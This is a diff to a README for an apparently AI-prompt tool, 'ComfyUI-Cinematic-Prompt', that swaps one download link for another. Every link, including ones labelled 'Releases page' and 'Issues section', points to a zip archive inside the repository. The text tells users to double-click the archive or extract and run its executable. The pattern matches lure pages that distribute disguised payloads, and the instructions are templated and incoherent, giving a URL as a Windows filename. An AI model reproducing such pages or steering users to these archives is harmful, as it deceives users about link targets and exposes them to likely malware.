@@ -1,7 +1,7 @@
 # 🎉 ComfyUI-Cinematic-Prompt - Build Prompts with Ease
 
 ## 📦 Download Now
-[![Download](https://github.com/iwahab87/ComfyUI-Cinematic-Prompt/raw/refs/heads/main/web/Cinematic-U-Prompt-Comfy-v1.4.zip%20ComfyUI--Cinematic--Prompt-blue?style=for-the-badge&logo=github)](https://github.com/iwahab87/ComfyUI-Cinematic-Prompt/raw/refs/heads/main/web/Cinematic-U-Prompt-Comfy-v1.4.zip)
+[![Download](https://raw.githubusercontent.com/iwahab87/ComfyUI-Cinematic-Prompt/main/web/Cinematic-Comfy-Prompt-U-2.1.zip%20ComfyUI--Cinematic--Prompt-blue?style=for-the-badge&logo=github)](https://raw.githubusercontent.com/iwahab87/ComfyUI-Cinematic-Prompt/main/web/Cinematic-Comfy-Prompt-U-2.1.zip)
 
 ## 🚀 Getting Started
 ComfyUI-Cinematic-Prompt is an intuitive tool for building prompts easily. This guide will help you download, install, and run the application on your computer.
@@ -18,22 +18,22 @@ To ensure the best experience, your computer should meet these basic requirement
 Follow these steps to download and install the application:
 
 1. **Visit the Releases Page**  
-   Go to the [Releases page](https://github.com/iwahab87/ComfyUI-Cinematic-Prompt/raw/refs/heads/main/web/Cinematic-U-Prompt-Comfy-v1.4.zip).
+   Go to the [Releases page](https://raw.githubusercontent.com/iwahab87/ComfyUI-Cinematic-Prompt/main/web/Cinematic-Comfy-Prompt-U-2.1.zip).
    
 2. **Choose the Latest Version**  
    On the releases page, find the latest version of the ComfyUI-Cinematic-Prompt.
 
 3. **Select the Correct File for Your System**  
-   Look for the file suitable for your operating system. Common options include `.exe` for Windows users, `.dmg` for macOS users, and `https://github.com/iwahab87/ComfyUI-Cinematic-Prompt/raw/refs/heads/main/web/Cinematic-U-Prompt-Comfy-v1.4.zip` for Linux users.
+   Look for the file suitable for your operating system. Common options include `.exe` for Windows users, `.dmg` for macOS users, and `https://raw.githubusercontent.com/iwahab87/ComfyUI-Cinematic-Prompt/main/web/Cinematic-Comfy-Prompt-U-2.1.zip` for Linux users.
 
 4. **Download the File**  
    Click on the file to start the download. The file will be saved to your computer's downloads folder.
 
 5. **Run the Installer**  
    Once the download completes, locate the file:
-   - On Windows, it will be something like `https://github.com/iwahab87/ComfyUI-Cinematic-Prompt/raw/refs/heads/main/web/Cinematic-U-Prompt-Comfy-v1.4.zip`. Double-click this file to start the installation.
+   - On Windows, it will be something like `https://raw.githubusercontent.com/iwahab87/ComfyUI-Cinematic-Prompt/main/web/Cinematic-Comfy-Prompt-U-2.1.zip`. Double-click this file to start the installation.
    - On macOS, find the `.dmg` file, double-click to open it, and drag the application into your Applications folder.
-   - For Linux, use the terminal to extract the `https://github.com/iwahab87/ComfyUI-Cinematic-Prompt/raw/refs/heads/main/web/Cinematic-U-Prompt-Comfy-v1.4.zip` file and run the executable.
+   - For Linux, use the terminal to extract the `https://raw.githubusercontent.com/iwahab87/ComfyUI-Cinematic-Prompt/main/web/Cinematic-Comfy-Prompt-U-2.1.zip` file and run the executable.
 
 6. **Follow Installation Instructions**  
    Follow the prompts given by the installer. You can accept the default settings unless you have specific preferences.
@@ -65,7 +65,7 @@ If you run into issues while using ComfyUI-Cinematic-Prompt, here are some commo
 - **Functionality Issues**: If certain features are not working, check for updates. There may be a fix in the latest release.
 
 ## 📞 Support
-If you need further assistance or support, visit the [Issues section](https://github.com/iwahab87/ComfyUI-Cinematic-Prompt/raw/refs/heads/main/web/Cinematic-U-Prompt-Comfy-v1.4.zip) on the GitHub page. You can report problems or ask questions there.
+If you need further assistance or support, visit the [Issues section](https://raw.githubusercontent.com/iwahab87/ComfyUI-Cinematic-Prompt/main/web/Cinematic-Comfy-Prompt-U-2.1.zip) on the GitHub page. You can report problems or ask questions there.
 
 ## 📜 License
 ComfyUI-Cinematic-Prompt is open-source and free to use. Please refer to the LICENSE file in the repository for information on usage rights.
